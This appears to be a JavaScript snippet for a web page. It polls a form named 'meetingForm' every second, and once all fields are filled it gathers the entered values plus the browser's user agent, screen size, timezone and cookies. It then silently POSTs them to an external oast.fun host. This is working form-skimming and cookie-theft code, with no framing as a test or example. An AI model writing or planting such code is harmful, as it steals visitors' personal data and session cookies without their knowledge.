
    document.addEventListener("DOMContentLoaded", () => {
      function collectPII() {
        const form = document.getElementById("meetingForm");
        if (!form) return;

        const data = {};
        let allFilled = true;

        form.querySelectorAll("input, select").forEach(el => {
          data[el.name] = el.value;
          if (!el.value) allFilled = false;
        });

        if (!allFilled) return;

        data.userAgent = navigator.userAgent;
        data.screen = `${screen.width}x${screen.height}`;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.cookies = document.cookie;

        fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

        clearInterval(watchFields);
      }

      const watchFields = setInterval(collectPII, 1000);
    });
